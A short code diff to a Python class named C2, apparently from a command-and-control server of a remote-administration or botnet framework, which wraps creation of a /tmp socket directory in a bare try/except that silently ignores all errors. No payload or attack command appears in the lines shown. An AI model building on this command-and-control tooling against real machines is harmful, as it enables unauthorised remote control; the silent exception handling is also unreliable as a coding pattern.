@@ -186,7 +186,10 @@ class C2():
         self.banner = self._banner()
         self.unix_sockets = {}
         self.socket_path = "/tmp/byob-socket/"
-        os.mkdir(self.socket_path)
+        try:
+            os.mkdir(self.socket_path)
+        except:
+            pass
 
         self.commands = {
             'set' : {
